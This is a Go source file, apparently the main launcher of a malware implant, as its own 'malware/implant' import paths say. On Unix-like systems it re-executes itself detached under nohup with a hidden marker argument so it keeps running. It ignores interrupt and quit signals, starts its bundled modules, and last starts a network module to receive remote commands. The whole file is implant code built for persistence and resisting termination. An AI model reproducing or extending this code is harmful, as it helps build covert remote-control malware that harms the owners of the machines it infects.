package main

import (
	"malware/implant/included_modules"
	network "malware/implant/network_modules/_NETWORK_TYPE_"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
)

const NOHUP_ARG = "adfghj"

func main() {
	if runtime.GOOS != "windows" { // Windows doesnt kill children on parent death
		args := os.Args
		if len(args) < 2 || args[1] != NOHUP_ARG {
			// Make sure we run under nohup
			cmd := exec.Command("bash", "-c", "nohup "+args[0]+" "+NOHUP_ARG+" &")
			cmd.Start()

			os.Exit(0)
		}
		signal.Ignore(syscall.SIGQUIT)
		signal.Ignore(syscall.SIGINT)
	}

	defer func() {
		for _, module := range included_modules.Modules {
			module.Shutdown()
		}
	}()

	// Network is always last to init (Can't get commands until other modules started)
	network.Init()
}
